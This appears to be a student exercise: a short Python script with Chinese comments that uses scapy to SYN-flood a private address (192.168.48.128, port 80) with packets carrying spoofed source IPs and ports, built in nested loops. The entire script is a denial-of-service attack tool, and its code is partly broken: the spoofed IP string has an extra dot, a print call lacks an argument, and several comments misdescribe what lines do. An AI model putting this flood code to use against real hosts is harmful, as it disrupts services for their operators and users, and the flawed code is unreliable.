# -*- codeing = utf-8 -*-
# 时间:2021/11/29 19:29
# 作者:CK
# 文件名:某python题.py
# 开发环境:PyCharm
from scapy.all import *#导入scapy这个端口，并引用所有的功能

def syn_floop(packet):#自定义一个函数
    sendp(packet)#在自定义函数里，用scapy里的sendp函数发送数据

eth=Ether()#将以太网的协议放进eth这个变量里
ip=IP()#将IP的协议放进eth这个变量里
ip.dst='192.168.48.128'#锁定对方的IP的目的地址
tcp=TCP()#将TCP的协议放进eth这个变量里
packet=eth/ip/tcp#Ether、IP和TCP三层协议组合的数据包
tcp.dport=80#填写目的端口
m=0#计数器

for i in range(1,255):#构建IP
    for j in range(1, 255):#构建IP
        for k in range(1, 255):#构建IP
            for n in range(1, 255):#构建IP
#以上四句都是在构建IP，范围是1.1.1.1-254.254.254.254
                for sp in range(1, 65535):#扫描1~65534次
                    ip.src=str(i)+'.'+'.'+str(j)+'.'+str(k)+'.'+str(n)#ip的相对路径等于IP的目的地址
                    tcp.sport=sp#使源端口与目标端口一致
                    syn_floop(packet)#调用自定义函数
                    print('send 1 in %s and port %s'%(ip.src))#打印
                    m=m+1#每运行一次计数器加一
                    print(m)#打印计数器
                    '原理：利用循环，暴力寻找，然后发送数据包，进行攻击'